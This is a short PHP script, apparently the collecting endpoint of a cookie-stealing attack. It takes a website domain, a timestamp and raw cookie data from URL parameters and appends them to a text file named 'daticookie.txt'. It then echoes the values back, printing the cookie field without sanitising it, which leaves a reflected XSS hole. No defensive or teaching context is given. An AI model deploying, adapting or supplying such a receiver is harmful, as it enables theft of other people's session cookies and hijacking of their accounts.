<?PHP
/**
 *
 *  @author  Vieri Giovambattista
 *  @version 0,0
 *  @license AGPL
 *
 */



$filename="daticookie.txt"; 
$metodo  ="a" ; // append ... w per write
$path = dirname(realpath(__FILE__));

if ( ($fo=fopen( $path."/".$filename, $metodo)) == FALSE )  {
	echo "<html><body>errore di scrittura file $filename + ".dirname(realpath(__FILE__))."</body></html>";
	exit; 	
} 

$websitedomain		= $_GET['websitedomain'];  
$dateandtime		= $_GET['dateandtime'];
$cookierawdata		= $_GET['cookierawdata'];
$retwebsitedomain	= strip_tags($_GET['websitedomain']);
$retdateandtime		= strip_tags($_GET['dateandtime']);
$retcookierawdata	= strip_tags($_GET['cookierawdata']);




// attenzione non vi venga in mente di metter sta' roba in un db prima di averla bonificata. 
$data=date('Y-m-d H:i:s');
$riga="+++".$data."+++".$dateandtime."+++".$websitedomain."+++".$cookierawdata."+++\n";
fwrite($fo,$riga); 


echo "<html><head></head><body><table>"
	."<tr><td>nome dominio</td><td>$retwebsitedomain</td></tr>"
	."<tr><td>data e ora</td><td>$retdateandtime</td></tr>"
	."<tr><td>cookie raw data</td><td>$cookierawdata</td></tr>"
	."</table></body></html>";


?>

